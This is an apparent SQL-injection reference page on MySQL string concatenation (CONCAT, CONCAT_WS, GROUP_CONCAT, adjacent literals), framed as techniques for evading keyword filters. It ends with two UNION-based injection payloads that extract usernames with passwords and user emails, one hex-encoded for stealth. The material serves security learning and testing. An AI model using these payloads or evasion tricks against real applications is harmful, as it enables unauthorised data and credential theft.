---
title: String Concatenation
description: Methods for string concatenation in MySQL
category: Injection Techniques
order: 11
tags: ["string operations", "concatenation", "sql functions"]
lastUpdated: 2025-03-15
---

## String Concatenation

String concatenation is essential for constructing complex queries or bypassing filters during SQL injection. MySQL provides several methods to concatenate strings.

### Direct String Adjacency

MySQL automatically concatenates adjacent string literals (without any operator):

```sql
SELECT 'a' 'd' 'mi' 'n';
-- Result: 'admin'

SELECT 'sel' 'ect';
-- Result: 'select'
```

This technique is useful for bypassing keyword filters since the string is never written as a single token.

### CONCAT() Function

The most common method for string concatenation in MySQL is the `CONCAT()` function:

```sql
SELECT CONCAT('a', 'b', 'c');
-- Result: 'abc'
```

If any argument is NULL, `CONCAT()` returns NULL:

```sql
SELECT CONCAT('a', NULL, 'c');
-- Result: NULL
```

### CONCAT_WS() Function

`CONCAT_WS()` (Concatenate With Separator) joins strings with a specified separator:

```sql
SELECT CONCAT_WS(',', 'a', 'b', 'c');
-- Result: 'a,b,c'
```

`CONCAT_WS()` skips NULL values but returns NULL if the separator is NULL:

```sql
SELECT CONCAT_WS(',', 'a', NULL, 'c');
-- Result: 'a,c'
```

### Using the "+" Operator

Unlike some other SQL dialects, MySQL doesn't support the "+" operator for string concatenation. In MySQL, "+" performs numeric addition:

```sql
SELECT 'a' + 'b';
-- Result: 0 (converts strings to numbers, then adds)
```

### GROUP_CONCAT() Function

For aggregating multiple rows into a single string:

```sql
SELECT GROUP_CONCAT(username) FROM users;
-- Result: 'user1,user2,user3,...'

-- With custom separator and ordering
SELECT GROUP_CONCAT(username ORDER BY created_at DESC SEPARATOR ';') FROM users;
-- Result: 'user3;user2;user1'
```

### Example Use Cases in Injection

```sql
-- Extracting multiple column values into a single result
' UNION SELECT CONCAT(username, ':', password) FROM users-- -

-- Using hex values for stealthier injection
' UNION SELECT CONCAT(0x7573657269643a, userid, 0x20656D61696C3a, email) FROM users-- -
```

These concatenation techniques can be invaluable for crafting advanced injection payloads, especially when limited space is available or when trying to extract multiple pieces of information in a single query.
